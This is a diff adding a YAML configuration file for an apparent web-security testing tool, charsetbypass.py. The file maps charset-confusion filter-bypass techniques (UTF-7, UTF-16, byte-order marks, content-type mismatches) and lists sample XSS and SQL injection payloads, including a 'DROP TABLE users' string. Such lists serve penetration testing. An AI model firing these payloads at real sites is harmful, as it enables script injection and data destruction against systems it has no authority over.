@@ -1,0 +1,58 @@
+# Charset Bypass Payloads
+# Usado por charsetbypass.py
+# Última atualização: 2026-07-17
+
+category_map:
+  meta:
+    - meta_charset_utf7
+    - meta_charset_utf16
+    - meta_http_equiv
+  content_type:
+    - ct_utf7
+    - ct_utf16
+    - ct_iso8859
+    - ct_mismatch
+    - ct_utf8_as_latin1
+    - ct_latin1_as_utf8
+    - ct_utf7_xss
+    - ct_win1252_as_utf8
+    - ct_utf16_as_iso
+    - ct_multipart_mismatch
+  bom:
+    - bom_utf7
+    - bom_utf16_le
+    - bom_utf16_be
+  xml:
+    - xml_utf7
+    - xml_utf16
+    - xml_iso8859
+  mixed:
+    - meta_bom
+    - ct_meta
+    - ct_xml
+
+charsets:
+  utf-7: utf-7
+  utf-7-imap: utf-7-imap
+  utf-16-le: utf-16le
+  utf-16-be: utf-16be
+  utf-32-le: utf-32le
+  utf-32-be: utf-32be
+  iso-8859-1: iso-8859-1
+  iso-8859-15: iso-8859-15
+  windows-1252: windows-1252
+  koi8-r: koi8-r
+  mac-roman: macintosh
+  x-user-defined: x-user-defined
+
+xss_payloads:
+  - "<script>alert(1)</script>"
+  - <img src=x onerror=alert(1)>
+  - <svg onload=alert(1)>
+  - javascript:alert(1)
+
+sqli_payloads:
+  - "' OR 1=1 --"
+  - "1; DROP TABLE users"
+  - "' UNION SELECT NULL--"
+  - "admin'--"
